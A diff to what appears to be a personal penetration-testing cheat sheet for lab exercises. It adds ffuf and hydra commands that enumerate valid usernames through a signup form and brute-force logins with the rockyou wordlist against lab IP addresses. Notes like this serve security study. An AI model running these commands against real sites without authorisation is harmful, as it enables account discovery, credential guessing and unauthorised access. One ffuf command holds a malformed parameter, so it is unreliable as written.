@@ -15,6 +15,15 @@
         ffuf -w dns_nameslist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.244.57 -fs 2395
  - ### find directories for a website
         gobuster -w directory_list.txt -u 10.10.244.57
+ - ### find valid usernames with ffuz
+        ffuf -w ~/tools/usernames_list.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.176.13/customers/signup -mr "username already exists"
+ - ### find valid usernames with hydra (S= denotes succesful message or stop condition)
+        hydra -L ~/tools/usernames_list.txt -p x 10.10.61.61 http-post-form "/customers/signup:username=^USER^&email=x&password=x&cpassword=x:S=An account with this username already exists"
+ - ### brute force username/password with ffuf
+        ffuf -w validusernames.txt:W1,/home/misael/tools/rockyou.txt:W2 -X POST -d "username:W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.61.61/customers/login -fc 200
+ - ### brute force username/password with hydra
+        hydra -L validusernames.txt -P ~/tools/rockyou.txt 10.10.61.61 http-post-form "/customers/login:username=^USER^&password=^PASS^:Incorrect username/Password"
+        
 
 ## PHP
 
